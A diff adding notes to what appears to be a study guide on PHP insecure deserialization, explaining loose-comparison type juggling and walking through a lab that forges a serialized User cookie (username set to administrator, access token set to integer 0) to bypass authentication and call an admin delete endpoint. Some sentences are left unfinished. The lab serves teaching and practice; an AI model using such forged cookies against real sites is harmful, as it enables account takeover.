@@ -173,6 +173,111 @@ If Ah → then it really does **deserialization**.
      <summary>Modifying data types</summary>
 
 
+1) A quick background on Loose Comparison in PHP
+
+=============================================
+
+-   PHP, when you compare two values ​​using `==` (non-strict comparison or **Loose Comparison**), tries to convert the types to each other if they differ.
+
+-   A simple example:
+
+`5 == "5"  // true  `
+
+Because PHP converts string `"5"` to an integer 5 before comparing.
+
+* * * * *
+
+
+2) A very important point:
+
+==================
+
+If a string begins with a number and is followed by letters, PHP **converts** all the text to just the first number and ignores the rest.
+
+example:
+
+`5 == "5 of something"  // true  `
+
+Because PHP converts `5 of something` → only the number 5, and 5 == 5 is true.
+
+
+3) Strange case in PHP 7.x and below:
+==============================
+
+`0 == "Example string" // true `
+
+This is because PHP converts the string that does not start with a number to 0 digitally!\
+In PHP 8 this statement was changed and is now `false`.
+
+
+4) How is this related to Insecure Deserialization?
+===============================================
+
+If there is a code like this:
+
+`$login = unserialize($_COOKIE['login']); if ($login['password'] == $password) { // Allow login } `
+
+* * * * *
+
+Scenario:
+----------
+
+- The server expects `password` to be a string (eg "mypassword").
+
+- The attacker changes the cookie and sends a serialized object with `password` as 0 (integer).
+
+- When the server unserializes, the following happens:
+
+`$login['password'] = 0; // Type int, not string `
+
+-And the comparison here:
+
+`0 == "mypassword"`
+
+In PHP 7.x and lower → **equals true**!\
+Because `"mypassword"` turns to 0.
+
+* * * * *
+
+The result?
+========
+
+The attacker is able to bypass the password **due to a weakness in the non-strict comparison**, which appears because:
+
+- The deserialization returns the original type (int 0) and not string.
+
+- The code depends on the comparison `==`, which converts types.
+
+* * * * *
+
+5) Important notes:
+================
+
+- If the code takes the password directly from the request (for example from POST) as a string, instead of taking it from the object after unserialize, the condition will be:
+
+`"0" == "mypassword" // false `
+
+Because the two types and string are different.
+
+
+8) A final point about modifying data in a serialized string
+====================================================
+
+If you change a data type from string to int in a serialized string, you must modify the length of the string and the number of characters associated with the data type in serialized, otherwise unserialize will fail.
+
+for example:
+
+`s:4:"1234"; // string length is 4`
+
+If you convert it to an integer:
+
+`i:1234; // int, no length ` is required
+
+You must be precise for unserialize to work.
+
+
+
+
 
 
 
@@ -274,3 +379,80 @@ O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}%3d
 
   
 </details>
+
+
+<details>
+     <summary>Lab: Modifying serialized data types</summary>
+
+
+1. login as **`wiener`**
+2. look at the cookie after login 
+
+<img width="1910" height="860" alt="image" src="https://github.com/user-attachments/assets/d56998c4-ec23-4d1e-9dee-04478a69910f" />
+
+```json
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"wunlak899krb4ov0lwgbhct6jx8u5ya2";}
+```
+
+3. now  and 
+
+- change `wiener` to `administrator`
+- change **`s:6`** to **`s:13`**
+- change `s:32:"wunlak899krb4ov0lwgbhct6jx8u5ya2"` To `i:0`
+
+
+```json
+O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+```
+
+
+> ## now server will compare the admin token which is stirng with `0` and because this is `php 7` it will  
+
+```
+# if token of admin is "kjhsafdkjasdhfjkajkdf"
+
+0 == "kjhsafdkjasdhfjkajkdf" // true
+
+```
+
+<img width="1629" height="703" alt="image" src="https://github.com/user-attachments/assets/7b2fca8c-fef7-4a79-8b44-4bc6e76fb778" />
+
+4. now send request
+
+```http
+/admin/delete?username=carlos
+```
+
+<img width="1536" height="693" alt="image" src="https://github.com/user-attachments/assets/877ff803-3b99-4048-8300-a1b631ca7e62" />
+
+
+
+
+     
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
